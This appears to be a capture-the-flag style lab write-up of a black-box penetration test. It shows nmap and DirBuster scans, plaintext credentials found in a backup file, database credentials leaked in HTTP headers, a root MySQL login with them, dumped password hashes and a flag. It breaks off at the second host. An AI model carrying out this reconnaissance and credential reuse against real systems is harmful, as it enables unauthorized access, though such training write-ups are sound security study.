---
description: >-
  You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range).
  Your goal is to read the flag file on each machine.
---

# Black Box Test #2

## Prework

### Connect to VPN

```bash
sudo openvpn black-box-penetration-test-2.ovpn
```

### Scan network

```bash
sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap &&
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt &&
sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml &&
nmap2md.sh portScan.xml | xclip
```

## Scanner

> Generated on **Mon Jul 12 18:49:14 2021** with `nmap 7.91`.

```bash
nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
```

## Hosts Alive (4)

| Host          | OS         | Accuracy |
| ------------- | ---------- | -------- |
| 172.16.64.81  | Linux 3.16 | 95%      |
| 172.16.64.91  | Linux 3.13 | 95%      |
| 172.16.64.92  | Linux 3.12 | 95%      |
| 172.16.64.166 | Linux 3.12 | 95%      |

## Open Ports and Running Services

### ✔️172.16.64.81 (Linux 3.16 - 95%)

| Port      | State | Service | Version                         |
| --------- | ----- | ------- | ------------------------------- |
| 22/tcp    | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp    | open  | http    | Apache httpd 2.4.18             |
| 13306/tcp | open  | mysql   | MySQL 5.7.25-0ubuntu0.16.04.2   |

{% hint style="info" %}
**We found the following hosts in a host.bak file!**&#x20;

While inspecting sabrina's ssh account on **ssh://sabrina:CHANGEME@172.16.64.166:222**

```
172.16.64.81	cms.foocorp.io
172.16.64.81  static.foocorp.io
```
{% endhint %}

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1" %}
* Target URL: [http://172.16.64.81](http://172.16.64.81)
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Mon Jul 12 19:22:08 EDT 2021
--------------------------------

http://172.16.64.81:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/webapp/
/default/
/webapp/img/
/webapp/templates/
/webapp/img/custom/
/webapp/img/favicon/
/webapp/templates/default/
/webapp/img/google/
/webapp/img/log_icons/
/webapp/templates/gallery/
/webapp/templates/pinboxes/
/webapp/img/custom/logo/
/webapp/assets/
/webapp/img/custom/thumbs/
/webapp/templates/gallery/font-awesome-4.6.3/
/webapp/templates/default/lang/
/webapp/templates/pinboxes/font-awesome-4.6.3/
/webapp/templates/gallery/img/
/webapp/templates/gallery/lang/
/webapp/templates/pinboxes/img/
/webapp/templates/pinboxes/js/
/webapp/templates/pinboxes/lang/
/webapp/assets/bootstrap/
/webapp/upload/
/webapp/assets/font-awesome/
/webapp/templates/pinboxes/font-awesome-4.6.3/css/
/webapp/upload/files/
/webapp/assets/bootstrap/css/
/webapp/templates/pinboxes/font-awesome-4.6.3/fonts/
/webapp/templates/gallery/font-awesome-4.6.3/css/
/webapp/assets/bootstrap/fonts/
/webapp/assets/font-awesome/css/
/webapp/templates/gallery/font-awesome-4.6.3/fonts/
/webapp/templates/pinboxes/font-awesome-4.6.3/less/
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/
/webapp/templates/gallery/font-awesome-4.6.3/less/
/webapp/assets/font-awesome/fonts/
/webapp/assets/bootstrap/js/
/webapp/templates/gallery/font-awesome-4.6.3/scss/
/webapp/assets/font-awesome/less/
/webapp/assets/font-awesome/scss/
/webapp/css/
/webapp/includes/
/webapp/includes/Google/
/webapp/includes/classes/
/webapp/includes/Google/Oauth2/
/webapp/includes/Google/Oauth2/auth/
/webapp/includes/Google/Oauth2/cache/
/webapp/includes/Google/Oauth2/contrib/
/webapp/includes/Google/Oauth2/external/
/webapp/includes/Google/Oauth2/io/
/webapp/includes/js/
/webapp/includes/Google/Oauth2/service/
/webapp/install/
/webapp/includes/phpass/
/webapp/includes/js/bootstrap-datepicker/
/webapp/includes/js/bootstrap-spinedit/
/webapp/includes/phpmailer/
/webapp/includes/plupload/
/webapp/includes/js/bootstrap-toggle/
/webapp/includes/random_compat/
/webapp/includes/js/chosen/
/webapp/includes/phpass/c/
/webapp/includes/js/ckeditor/
/webapp/includes/plupload/js/
/webapp/includes/js/bootstrap-toggle/doc/
/webapp/includes/js/flot/
/webapp/includes/js/bootstrap-spinedit/css/
/webapp/includes/js/footable/
/webapp/includes/js/bootstrap-spinedit/js/
/webapp/includes/js/chosen/docsupport/
/webapp/includes/js/bootstrap-datepicker/css/
/webapp/includes/js/bootstrap-toggle/js/
/webapp/includes/js/footable/css/
/webapp/includes/plupload/js/i18n/
/webapp/includes/js/jen/
/webapp/includes/js/bootstrap-datepicker/js/
/webapp/includes/js/footable/css/fonts/
/webapp/includes/js/ckeditor/adapters/
/webapp/includes/js/jquery-tags-input/
/webapp/includes/plupload/js/jquery.plupload.queue/
/webapp/includes/plupload/js/jquery.plupload.queue/css/
/webapp/includes/plupload/js/jquery.plupload.queue/img/
/webapp/includes/js/bootstrap-datepicker/js/locales/
/webapp/includes/js/ckeditor/lang/
/webapp/includes/js/ckeditor/plugins/
/webapp/includes/timthumb/
/webapp/includes/js/jen/bin/
/webapp/includes/js/ckeditor/skins/
/webapp/includes/timthumb/cache/
/webapp/includes/js/ckeditor/plugins/about/
/webapp/includes/js/ckeditor/plugins/clipboard/
/webapp/includes/js/ckeditor/skins/moono-lisa/
/webapp/includes/js/ckeditor/plugins/dialog/
/webapp/includes/phpmailer/extras/
/webapp/includes/js/ckeditor/plugins/about/dialogs/
/webapp/includes/widgets/
/webapp/includes/js/ckeditor/plugins/link/
/webapp/includes/js/ckeditor/plugins/clipboard/dialogs/
/webapp/includes/phpmailer/language/
/webapp/includes/js/ckeditor/plugins/link/images/
/webapp/includes/js/ckeditor/skins/moono-lisa/images/
/webapp/includes/js/ckeditor/plugins/link/dialogs/
/webapp/includes/js/ckeditor/plugins/link/images/hidpi/
/webapp/includes/js/ckeditor/plugins/about/dialogs/hidpi/
/webapp/includes/js/ckeditor/skins/moono-lisa/images/hidpi/
/webapp/lang/
/webapp/includes/js/bootstrap-toggle/css/

Dirs found with a 403 response:

/icons/
/icons/small/


--------------------------------
Files found during testing:

Files found with a 302 responce:

/webapp/process.php
/webapp/templates/session_check.php
/webapp/includes/actions.log.export.php

Files found with a 200 responce:

/webapp/img/ps-icon.svg
/webapp/templates/default/main.css
/webapp/templates/gallery/main.css
/webapp/templates/pinboxes/lang/en.mo
/webapp/templates/pinboxes/js/imagesloaded.pkgd.min.js
/webapp/templates/gallery/lang/en.mo
/webapp/templates/pinboxes/font-awesome-4.6.3/HELP-US-OUT.txt
/webapp/templates/default/lang/default.pot
/webapp/templates/pinboxes/main.css
/webapp/templates/gallery/font-awesome-4.6.3/HELP-US-OUT.txt
/webapp/img/custom/thumbs/users.bak
/webapp/templates/gallery/lang/en.po
/webapp/templates/pinboxes/main.css.map
/webapp/templates/default/lang/en.mo
/webapp/templates/pinboxes/js/jquery.masonry.min.js
/webapp/assets/bootstrap/config.json
/webapp/templates/default/lang/en.po
/webapp/templates/pinboxes/lang/en.po
/webapp/templates/pinboxes/main.scss
/webapp/templates/gallery/lang/gallery.pot
/webapp/assets/font-awesome/HELP-US-OUT.txt
/webapp/templates/pinboxes/lang/pinboxes.pot
/webapp/templates/pinboxes/font-awesome-4.6.3/css/font-awesome.css
/webapp/templates/pinboxes/font-awesome-4.6.3/css/font-awesome.min.css
/webapp/templates/gallery/font-awesome-4.6.3/css/font-awesome.css
/webapp/templates/pinboxes/font-awesome-4.6.3/fonts/FontAwesome.otf
/webapp/assets/bootstrap/css/bootstrap-theme.css
/webapp/templates/gallery/font-awesome-4.6.3/fonts/FontAwesome.otf
/webapp/assets/font-awesome/css/font-awesome.css
/webapp/templates/pinboxes/font-awesome-4.6.3/fonts/fontawesome-webfont.eot
/webapp/templates/gallery/font-awesome-4.6.3/css/font-awesome.min.css
/webapp/assets/bootstrap/fonts/glyphicons-halflings-regular.eot
/webapp/templates/gallery/font-awesome-4.6.3/scss/_animated.scss
/webapp/assets/font-awesome/less/animated.less
/webapp/assets/bootstrap/js/bootstrap.js
/webapp/assets/bootstrap/fonts/glyphicons-halflings-regular.svg
/webapp/assets/font-awesome/css/font-awesome.min.css
/webapp/templates/pinboxes/font-awesome-4.6.3/fonts/fontawesome-webfont.svg
/webapp/templates/gallery/font-awesome-4.6.3/less/animated.less
/webapp/assets/font-awesome/fonts/FontAwesome.otf
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_animated.scss
/webapp/templates/gallery/font-awesome-4.6.3/fonts/fontawesome-webfont.eot
/webapp/assets/bootstrap/css/bootstrap-theme.css.map
/webapp/templates/pinboxes/font-awesome-4.6.3/less/animated.less
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_bordered-pulled.scss
/webapp/templates/gallery/font-awesome-4.6.3/less/bordered-pulled.less
/webapp/assets/bootstrap/css/bootstrap-theme.min.css
/webapp/assets/font-awesome/fonts/fontawesome-webfont.eot
/webapp/templates/gallery/font-awesome-4.6.3/scss/_bordered-pulled.scss
/webapp/assets/bootstrap/js/bootstrap.min.js
/webapp/assets/font-awesome/less/bordered-pulled.less
/webapp/templates/gallery/font-awesome-4.6.3/fonts/fontawesome-webfont.svg
/webapp/templates/pinboxes/font-awesome-4.6.3/fonts/fontawesome-webfont.ttf
/webapp/assets/font-awesome/scss/_animated.scss
/webapp/assets/bootstrap/js/npm.js
/webapp/assets/bootstrap/fonts/glyphicons-halflings-regular.ttf
/webapp/templates/gallery/font-awesome-4.6.3/less/core.less
/webapp/templates/pinboxes/font-awesome-4.6.3/fonts/fontawesome-webfont.woff
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_core.scss
/webapp/assets/font-awesome/less/core.less
/webapp/templates/pinboxes/font-awesome-4.6.3/less/bordered-pulled.less
/webapp/assets/bootstrap/css/bootstrap-theme.min.css.map
/webapp/assets/font-awesome/scss/_bordered-pulled.scss
/webapp/templates/gallery/font-awesome-4.6.3/fonts/fontawesome-webfont.ttf
/webapp/templates/gallery/font-awesome-4.6.3/scss/_core.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/less/core.less
/webapp/assets/font-awesome/less/fixed-width.less
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_fixed-width.scss
/webapp/assets/bootstrap/fonts/glyphicons-halflings-regular.woff
/webapp/templates/pinboxes/font-awesome-4.6.3/fonts/fontawesome-webfont.woff2
/webapp/assets/font-awesome/scss/_core.scss
/webapp/templates/gallery/font-awesome-4.6.3/less/fixed-width.less
/webapp/templates/gallery/font-awesome-4.6.3/scss/_fixed-width.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/less/fixed-width.less
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_icons.scss
/webapp/assets/font-awesome/less/font-awesome.less
/webapp/assets/bootstrap/css/bootstrap.css
/webapp/assets/font-awesome/scss/_fixed-width.scss
/webapp/templates/gallery/font-awesome-4.6.3/fonts/fontawesome-webfont.woff
/webapp/templates/pinboxes/font-awesome-4.6.3/less/font-awesome.less
/webapp/assets/font-awesome/fonts/fontawesome-webfont.svg
/webapp/templates/gallery/font-awesome-4.6.3/less/font-awesome.less
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_larger.scss
/webapp/assets/bootstrap/fonts/glyphicons-halflings-regular.woff2
/webapp/templates/gallery/font-awesome-4.6.3/fonts/fontawesome-webfont.woff2
/webapp/assets/font-awesome/less/larger.less
/webapp/templates/gallery/font-awesome-4.6.3/scss/_larger.scss
/webapp/assets/font-awesome/fonts/fontawesome-webfont.ttf
/webapp/assets/font-awesome/fonts/fontawesome-webfont.woff
/webapp/assets/font-awesome/less/icons.less
/webapp/templates/gallery/font-awesome-4.6.3/scss/_icons.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_list.scss
/webapp/templates/gallery/font-awesome-4.6.3/less/icons.less
/webapp/assets/font-awesome/scss/_icons.scss
/webapp/templates/gallery/font-awesome-4.6.3/scss/_list.scss
/webapp/templates/gallery/font-awesome-4.6.3/less/larger.less
/webapp/assets/font-awesome/scss/_larger.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_mixins.scss
/webapp/assets/font-awesome/less/list.less
/webapp/assets/bootstrap/css/bootstrap.min.css
/webapp/assets/bootstrap/css/bootstrap.css.map
/webapp/templates/gallery/font-awesome-4.6.3/scss/_mixins.scss
/webapp/assets/font-awesome/less/mixins.less
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_path.scss
/webapp/assets/bootstrap/css/bootstrap.min.css.map
/webapp/templates/gallery/font-awesome-4.6.3/scss/_path.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_rotated-flipped.scss
/webapp/assets/font-awesome/less/path.less
/webapp/templates/gallery/font-awesome-4.6.3/less/list.less
/webapp/templates/pinboxes/font-awesome-4.6.3/less/larger.less
/webapp/assets/font-awesome/scss/_list.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/less/icons.less
/webapp/templates/gallery/font-awesome-4.6.3/scss/_rotated-flipped.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_screen-reader.scss
/webapp/assets/font-awesome/less/rotated-flipped.less
/webapp/assets/font-awesome/scss/_mixins.scss
/webapp/templates/gallery/font-awesome-4.6.3/scss/_screen-reader.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/less/list.less
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_stacked.scss
/webapp/assets/font-awesome/less/screen-reader.less
/webapp/assets/font-awesome/scss/_path.scss
/webapp/assets/font-awesome/scss/_rotated-flipped.scss
/webapp/assets/font-awesome/less/stacked.less
/webapp/assets/font-awesome/fonts/fontawesome-webfont.woff2
/webapp/templates/pinboxes/font-awesome-4.6.3/less/mixins.less
/webapp/templates/gallery/font-awesome-4.6.3/scss/_stacked.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/_variables.scss
/webapp/assets/font-awesome/scss/_screen-reader.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/less/path.less
/webapp/templates/gallery/font-awesome-4.6.3/less/mixins.less
/webapp/templates/pinboxes/font-awesome-4.6.3/scss/font-awesome.scss
/webapp/assets/font-awesome/less/variables.less
/webapp/templates/gallery/font-awesome-4.6.3/scss/_variables.scss
/webapp/assets/font-awesome/scss/_stacked.scss
/webapp/templates/gallery/font-awesome-4.6.3/scss/font-awesome.scss
/webapp/templates/pinboxes/font-awesome-4.6.3/less/rotated-flipped.less
/webapp/templates/gallery/font-awesome-4.6.3/less/path.less
/webapp/templates/pinboxes/font-awesome-4.6.3/less/screen-reader.less
/webapp/assets/font-awesome/scss/_variables.scss
/webapp/templates/gallery/font-awesome-4.6.3/less/rotated-flipped.less
/webapp/templates/pinboxes/font-awesome-4.6.3/less/stacked.less
/webapp/templates/gallery/font-awesome-4.6.3/less/screen-reader.less
/webapp/templates/pinboxes/font-awesome-4.6.3/less/variables.less
/webapp/assets/font-awesome/scss/font-awesome.scss
/webapp/templates/gallery/font-awesome-4.6.3/less/stacked.less
/webapp/templates/gallery/font-awesome-4.6.3/less/variables.less
/webapp/css/footable.css
/webapp/css/main.css.map
/webapp/css/main.min.css
/webapp/css/mobile.css.map
/webapp/css/main.scss
/webapp/css/mobile.min.css
/webapp/css/mobile.scss
/webapp/css/social-login.css
/webapp/includes/ajax-keep-alive.php
/webapp/includes/email-template.php
/webapp/includes/classes/actions-categories.php
/webapp/includes/functions.categories.php
/webapp/includes/classes/actions-clients.php
/webapp/includes/Google/Oauth2/Google_Client.php
/webapp/includes/classes/actions-files.php
/webapp/includes/functions.forms.php
/webapp/includes/functions.php
/webapp/includes/classes/actions-groups.php
/webapp/includes/Google/Oauth2/config.php
/webapp/includes/functions.templates.php
/webapp/includes/classes/actions-members.php
/webapp/includes/classes/actions-users.php
/webapp/includes/Google/Oauth2/auth/Google_AssertionCredentials.php
/webapp/includes/classes/database.php
/webapp/includes/language-locales-names.php
/webapp/includes/classes/file-upload.php
/webapp/includes/Google/Oauth2/cache/Google_Cache.php
/webapp/includes/Google/Oauth2/io/Google_CacheParser.php
/webapp/includes/Google/Oauth2/service/Google_BatchRequest.php
/webapp/includes/Google/Oauth2/auth/Google_LoginTicket.php
/webapp/includes/Google/Oauth2/external/URITemplateParser.php
/webapp/includes/classes/generate-form.php
/webapp/includes/classes/generate-table.php
/webapp/includes/Google/Oauth2/io/Google_HttpRequest.php
/webapp/includes/Google/Oauth2/service/Google_MediaFileUpload.php
/webapp/includes/classes/i18n.php
/webapp/includes/Google/Oauth2/service/Google_Model.php
/webapp/includes/Google/Oauth2/service/Google_Service.php
/webapp/includes/js/browserplus-min.js
/webapp/includes/Google/Oauth2/service/Google_ServiceResource.php
/webapp/includes/Google/Oauth2/auth/Google_Signer.php
/webapp/includes/js/bootstrap-spinedit/LICENSE.txt
/webapp/includes/phpass/PasswordHash.php
/webapp/includes/Google/Oauth2/io/Google_REST.php
/webapp/includes/js/bootstrap-datepicker/CHANGELOG.md
/webapp/includes/sys.config.php
/webapp/includes/phpmailer/LICENSE
/webapp/includes/Google/Oauth2/service/Google_Utils.php
/webapp/includes/plupload/changelog.txt
/webapp/includes/js/bootstrap-spinedit/README.md
/webapp/includes/js/chosen/options.html
/webapp/includes/js/bootstrap-datepicker/CONTRIBUTING.md
/webapp/includes/Google/Oauth2/auth/Google_Verifier.php
/webapp/includes/phpmailer/PHPMailerAutoload.php
/webapp/includes/random_compat/random_compat.phar
/webapp/includes/Google/Oauth2/io/cacerts.pem
/webapp/includes/js/bootstrap-datepicker/LICENSE
/webapp/includes/plupload/license.txt
/webapp/includes/phpmailer/VERSION
/webapp/includes/js/chosen/index.proto.html
/webapp/includes/js/bootstrap-toggle/doc/nytdev.svg
/webapp/includes/sys.config.sample.php
/webapp/includes/random_compat/random_compat.phar.pubkey
/webapp/includes/js/bootstrap-toggle/doc/script.js
/webapp/includes/js/ckeditor/CHANGES.md
/webapp/includes/js/bootstrap-datepicker/README.md
/webapp/includes/js/chosen/chosen.jquery.js
/webapp/includes/phpass/c/Makefile
/webapp/includes/js/chosen/docsupport/prism.js
/webapp/includes/plupload/readme.md
/webapp/includes/phpmailer/class.phpmailer.php
/webapp/includes/random_compat/random_compat.phar.pubkey.asc
/webapp/includes/js/ckeditor/LICENSE.md
/webapp/includes/js/bootstrap-spinedit/css/bootstrap-spinedit.css
/webapp/includes/js/bootstrap-spinedit/js/bootstrap-spinedit.js
/webapp/includes/js/html5shiv.min.js
/webapp/includes/js/footable/footable.all.min.js
/webapp/includes/js/bootstrap-toggle/doc/stylesheet.css
/webapp/includes/js/ckeditor/README.md
/webapp/includes/phpass/c/crypt_private.c
/webapp/includes/js/bootstrap-toggle/js/bootstrap-toggle.js
/webapp/includes/js/chosen/index.html
/webapp/includes/js/chosen/docsupport/prism.css
/webapp/includes/phpmailer/class.phpmaileroauthgoogle.php
/webapp/includes/js/bootstrap-toggle/js/bootstrap-toggle.min.js
/webapp/includes/js/bootstrap-datepicker/css/datepicker.css
/webapp/includes/js/ckeditor/build-config.js
/webapp/includes/js/footable/footable.filter.min.js
/webapp/includes/plupload/js/i18n/cs.js
/webapp/includes/js/footable/css/footable.core.css
/webapp/includes/js/chosen/docsupport/style.css
/webapp/includes/js/chosen/chosen.proto.js
/webapp/includes/js/bootstrap-toggle/js/bootstrap-toggle.min.js.map
/webapp/includes/plupload/js/plupload.browserplus.js
/webapp/includes/js/jen/LICENSE
/webapp/includes/js/bootstrap-toggle/js/bootstrap2-toggle.js
/webapp/includes/timezone_identifiers_list.php
/webapp/includes/js/ckeditor/config.js
/webapp/includes/js/ckeditor/ckeditor.js
/webapp/includes/js/bootstrap-datepicker/js/bootstrap-datepicker.js
/webapp/includes/js/jquery.1.12.4.min.js
/webapp/includes/phpmailer/class.pop3.php
/webapp/includes/js/footable/css/footable.core.min.css
/webapp/includes/js/jquery-tags-input/jquery.tagsinput.css
/webapp/includes/js/footable/css/fonts/footable.eot
/webapp/includes/plupload/js/i18n/da.js
/webapp/includes/js/ckeditor/adapters/jquery.js
/webapp/includes/js/jquery-tags-input/jquery.tagsinput.min.js
/webapp/includes/js/ckeditor/contents.css
/webapp/includes/js/bootstrap-toggle/js/bootstrap2-toggle.min.js
/webapp/includes/js/jen/README.md
/webapp/includes/js/footable/css/footable.metro.css
/webapp/includes/js/footable/footable.min.js
/webapp/includes/phpmailer/class.smtp.php
/webapp/includes/plupload/js/jquery.plupload.queue/jquery.plupload.queue.js
/webapp/includes/timezones.php
/webapp/includes/js/bootstrap-toggle/js/bootstrap2-toggle.min.js.map
/webapp/includes/plupload/js/i18n/de.js
/webapp/includes/plupload/js/plupload.flash.js
/webapp/includes/plupload/js/jquery.plupload.queue/css/jquery.plupload.queue.css
/webapp/includes/plupload/js/i18n/el.js
/webapp/includes/plupload/js/plupload.flash.swf
/webapp/includes/phpmailer/composer.json
/webapp/includes/js/jquery.psendmodal.js
/webapp/includes/js/footable/css/fonts/footable.svg
/webapp/includes/js/footable/footable.paginate.min.js
/webapp/includes/plupload/js/i18n/es.js
/webapp/includes/js/footable/css/footable.metro.min.css
/webapp/includes/plupload/js/plupload.full.js
/webapp/includes/js/ckeditor/styles.js
/webapp/includes/js/jen/jen.js
/webapp/includes/plupload/js/i18n/et.js
/webapp/includes/plupload/js/plupload.gears.js
/webapp/includes/js/footable/footable.sort.min.js
/webapp/includes/js/jquery.validations.js
/webapp/includes/updates.functions.php
/webapp/includes/js/footable/css/fonts/footable.ttf
/webapp/includes/js/jen/bin/jen
/webapp/includes/plupload/js/plupload.html4.js
/webapp/includes/phpmailer/composer.lock
/webapp/includes/plupload/js/i18n/fa.js
/webapp/includes/js/jen/package.json
/webapp/includes/js/footable/css/footable.standalone.css
/webapp/includes/plupload/js/plupload.html5.js
/webapp/includes/updates.messages.php
/webapp/includes/plupload/js/plupload.js
/webapp/includes/js/js.cookie.js
/webapp/includes/plupload/js/i18n/fi.js
/webapp/includes/js/footable/css/footable.standalone.min.css
/webapp/includes/plupload/js/plupload.silverlight.js
/webapp/includes/js/footable/css/fonts/footable.woff
/webapp/includes/plupload/js/i18n/fr-ca.js
/webapp/includes/js/js.functions.php
/webapp/includes/plupload/js/plupload.silverlight.xap
/webapp/includes/js/main.js
/webapp/includes/phpmailer/extras/EasyPeasyICS.php
/webapp/includes/js/ckeditor/plugins/dialog/dialogDefinition.js
/webapp/includes/plupload/js/i18n/fr.js
/webapp/includes/phpmailer/extras/README.md
/webapp/includes/js/ckeditor/skins/moono-lisa/dialog.css
/webapp/includes/js/ckeditor/skins/moono-lisa/dialog_ie.css
/webapp/includes/plupload/js/i18n/hr.js
/webapp/includes/js/respond.min.js
/webapp/includes/phpmailer/extras/htmlfilter.php
/webapp/includes/plupload/js/i18n/hu.js
/webapp/includes/js/ckeditor/plugins/about/dialogs/about.js
/webapp/includes/js/ckeditor/skins/moono-lisa/dialog_ie8.css
/webapp/includes/widgets/news.php
/webapp/includes/plupload/js/i18n/it.js
/webapp/includes/phpmailer/extras/ntlm_sasl_client.php
/webapp/includes/js/ckeditor/plugins/clipboard/dialogs/paste.js
/webapp/includes/js/ckeditor/skins/moono-lisa/dialog_iequirks.css
/webapp/includes/js/ckeditor/plugins/link/dialogs/anchor.js
/webapp/includes/js/ckeditor/plugins/link/dialogs/link.js
/webapp/includes/plupload/js/i18n/ja.js
/webapp/includes/js/ckeditor/skins/moono-lisa/editor.css
/webapp/includes/plupload/js/i18n/ko.js
/webapp/includes/js/ckeditor/skins/moono-lisa/editor_gecko.css
/webapp/includes/plupload/js/i18n/lv.js
/webapp/includes/js/ckeditor/skins/moono-lisa/editor_ie.css
/webapp/includes/plupload/js/i18n/nl.js
/webapp/includes/js/ckeditor/skins/moono-lisa/editor_ie8.css
/webapp/includes/plupload/js/i18n/pl.js
/webapp/includes/js/ckeditor/skins/moono-lisa/editor_iequirks.css
/webapp/includes/js/ckeditor/skins/moono-lisa/readme.md
/webapp/includes/plupload/js/i18n/pt-br.js
/webapp/includes/plupload/js/i18n/ro.js
/webapp/includes/plupload/js/i18n/ru.js
/webapp/includes/plupload/js/i18n/sk.js
/webapp/includes/plupload/js/i18n/sr.js
/webapp/includes/plupload/js/i18n/sv.js
/webapp/lang/cftp_admin.pot
/webapp/lang/en.mo
/webapp/lang/en.po
/webapp/includes/js/bootstrap-toggle/css/bootstrap-toggle.css
/webapp/includes/js/bootstrap-toggle/css/bootstrap-toggle.min.css
/webapp/includes/js/bootstrap-toggle/css/bootstrap2-toggle.css
/webapp/includes/js/bootstrap-toggle/css/bootstrap2-toggle.min.css

Files found with a 500 responce:

/webapp/templates/common.php
/webapp/templates/default/template.php
/webapp/templates/gallery/template.php
/webapp/templates/pinboxes/template.php
/webapp/includes/active.session.php
/webapp/includes/core.update.php
/webapp/includes/core.update.silent.php
/webapp/includes/classes/actions-log.php
/webapp/includes/includes.php
/webapp/includes/Google/Oauth2/cache/Google_ApcCache.php
/webapp/includes/Google/Oauth2/auth/Google_Auth.php
/webapp/includes/language.php
/webapp/includes/classes/form-validation.php
/webapp/includes/Google/Oauth2/auth/Google_AuthNone.php
/webapp/includes/Google/Oauth2/cache/Google_FileCache.php
/webapp/includes/Google/Oauth2/io/Google_CurlIO.php
/webapp/includes/Google/Oauth2/cache/Google_MemcacheCache.php
/webapp/includes/Google/Oauth2/auth/Google_OAuth2.php
/webapp/includes/Google/Oauth2/auth/Google_P12Signer.php
/webapp/includes/Google/Oauth2/io/Google_HttpStreamIO.php
/webapp/includes/Google/Oauth2/io/Google_IO.php
/webapp/includes/classes/send-email.php
/webapp/includes/site.options.php
/webapp/includes/Google/Oauth2/auth/Google_PemVerifier.php
/webapp/includes/sys.vars.php
/webapp/includes/phpmailer/class.phpmaileroauth.php
/webapp/includes/thumb.php
/webapp/includes/userlevel_check.php
/webapp/includes/vars.php
/webapp/includes/phpmailer/get_oauth_token.php
/webapp/includes/widgets/actions-log.php
/webapp/includes/widgets/statistics.php
/webapp/includes/widgets/system-information.php


--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**Dirbuster found the following route with potential credentials!**

* [http://172.16.64.81:80/webapp/img/custom/thumbs/users.bak](http://172.16.64.81/webapp/img/custom/thumbs/users.bak)

```
john1:password123
peter:youdonotguessthatone5
```
{% endhint %}

{% hint style="warning" %}
**\[Web]  We get redirected trying to login with `john1:password123` and we find the application leaks database credentials in its headers!**

![](<../../.gitbook/assets/image (25).png>) ![](<../../.gitbook/assets/image (26).png>)&#x20;

```
HTTP/1.1 302 Found
Date: Thu, 22 Jul 2021 23:05:39 GMT
Server: Apache/2.4.18 (Ubuntu)
X-DB-Key: x41x41x412019!
X-DB-User: root
X-DB-name: mysql
Location: 500.php
Content-Length: 0
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
{% endhint %}

{% tabs %}
{% tab title="mysql-client" %}
```bash
mysql --host=172.16.64.81 \ 
      --user=root \
      --password=x41x41x412019! \
      --port 13306 mysql
```
{% endtab %}

{% tab title="Second Tab" %}
```bash
> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cmsbase            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.143 sec)
> use cmsbase;
> show tables;
+----------------------------+
| Tables_in_cmsbase          |
+----------------------------+
| flag                       |
| sqlmapfile                 |
| tbl_1_actions_log          |
| tbl_1_categories           |
| tbl_1_categories_relations |
| tbl_1_downloads            |
| tbl_1_files                |
| tbl_1_files_relations      |
| tbl_1_folders              |
| tbl_1_groups               |
| tbl_1_members              |
| tbl_1_members_requests     |
| tbl_1_notifications        |
| tbl_1_options              |
| tbl_1_password_reset       |
| tbl_1_users                |
| tbl_actions_log            |
| tbl_categories             |
| tbl_categories_relations   |
| tbl_downloads              |
| tbl_files                  |
| tbl_files_relations        |
| tbl_folders                |
| tbl_groups                 |
| tbl_members                |
| tbl_members_requests       |
| tbl_notifications          |
| tbl_options                |
| tbl_password_reset         |
| tbl_users                  |
+----------------------------+
30 rows in set (0.142 sec)

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**We find user credentials** on the `cmsbase.tbl_users` table:

```
MySQL [cmsbase]> select user,password,name,email from tbl_users;
+---------+--------------------------------------------------------------+---------+-------------------+
| user    | password                                                     | name    | email             |
+---------+--------------------------------------------------------------+---------+-------------------+
| foocorp | $2a$08$f2fG8Ncpmj815xQ9U3Ylh.uD0VW/X6kOgjPIEHKP547jspS0FlHF6 | foocorp | admin@foocorp.io  |
| mickey  | $2a$08$w/oljwDbODAThUR4HTVO8eUjTabE80sH0i6xnOR97ZXfsGGmxohAW | mickey  | mickey@foocorp.io |
| donald  | $2a$08$dK04y0KEURxDv02vYRab1OMYMSWbW/bpGF.eAWrWv9JAGaa4yTxlq | donald  | donald@foocorp.io |
+---------+--------------------------------------------------------------+---------+-------------------+
```
{% endhint %}

{% hint style="success" %}
**Flag encountered!** :grin:&#x20;

While inspecting database tables, we find our flag in the `cmsbase.flag` table.

```
select * from flag;
+----+------------------------------+
| id | content                      |
+----+------------------------------+
|  1 | Congratulations, you got it! |
+----+------------------------------+
1 row in set (0.141 sec)
```
{% endhint %}

### ✔️172.16.64.91 (Linux 3.13 - 95%)

| Port     | State | Service | Version               |
| -------- | ----- | ------- | --------------------- |
| 80/tcp   | open  | http    | Apache httpd 2.4.18   |
| 6379/tcp | open  | redis   | Redis key-value store |

{% hint style="info" %}
